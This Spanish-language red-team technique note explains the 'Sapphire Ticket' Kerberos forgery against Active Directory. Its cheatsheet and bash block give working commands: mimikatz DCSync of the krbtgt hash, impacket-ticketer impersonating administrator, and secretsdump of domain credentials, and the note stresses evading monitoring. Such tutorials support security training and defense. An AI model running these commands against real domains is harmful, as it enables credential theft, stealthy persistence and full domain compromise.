---
aliases:
  - Sapphire Ticket
tags:
  - technique/persistence
  - technique/kerberos
  - technique/defense-evasion
  - asset/active-directory
  - env/windows
  - cred/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[Diamond Ticket]]"
  - "[[Golden Ticket]]"
  - "[[Constrained Delegation (S4U)]]"
---
# Sapphire Ticket

La forma **más sigilosa** de forjar tickets. Como [[Diamond Ticket]], parte de material legítimo, pero en vez de inventar/editar el PAC, **obtiene el PAC real de un usuario privilegiado** vía **S4U2self + U2U** y lo inserta en el ticket. El PAC es **100% auténtico** (lo generó el DC para una cuenta real de DA), no una modificación → prácticamente indistinguible de un login legítimo del admin.

Requiere el hash de `krbtgt` (como Golden/Diamond) → [[DCSync]].

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `impacket-ticketer -request -impersonate administrator -domain corp.local -user lowpriv -password P -aesKey <krbtgt_AES> -domain-sid S-1-5-21-... lowpriv` | TGT con el **PAC real** de administrator (Sapphire) | Persistencia stealth máxima. |
| `ticketer.py ... -impersonate administrator -request` (flag `-request` = Sapphire) | Igual, sintaxis Impacket | Linux. |
| `lsadump::dcsync /user:krbtgt` (mimikatz) | Hash AES de krbtgt (insumo) | Pre-requisito. |
| `export KRB5CCNAME=admin.ccache; impacket-secretsdump -k -no-pass dc01` | Usar el ticket Sapphire | Validación / DCSync. |

```bash
# Impacket ticketer en modo Sapphire (-request -impersonate)
impacket-ticketer -request -impersonate administrator \
  -domain corp.local -domain-sid S-1-5-21-1004336348-1177238915-682003330 \
  -aesKey 5e3d19...krbtgt_AES256... \
  -user lowpriv -password 'Pass123!' lowpriv
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass dc01.corp.local
```

---

## Overview

Escala de sigilo de los forged tickets:

| **Técnica** | **PAC** | **Detección** |
|:---|:---|:---|
| [[Golden Ticket]] | Inventado offline | Más detectable (sin AS-REQ, PAC anómalo). |
| [[Diamond Ticket]] | TGT real, PAC modificado | Difícil (estructura real, campos editados). |
| **Sapphire Ticket** | TGT real + **PAC real de un DA** (S4U2self+U2U) | Casi indetectable (PAC auténtico de cuenta real). |

Sapphire pide al KDC, vía S4U2self, el PAC genuino de un usuario privilegiado y lo combina con el TGT → el ticket lleva los grupos/SIDs exactos que el DC asignaría a ese admin. No hay "edición" que detectar.

> [!tip] Trade-off
> Más sigiloso pero más complejo y requiere que el admin objetivo exista y sea S4U-eligible. Para máxima evasión en entornos monitoreados (MDI), es la opción top.

---

## Recursos

- [The Hacker Recipes — Sapphire ticket](https://www.thehacker.recipes/ad/persistence/kerberos/forged-tickets) — comparativa Golden/Diamond/Sapphire.
- [Impacket ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) — flag `-request`.
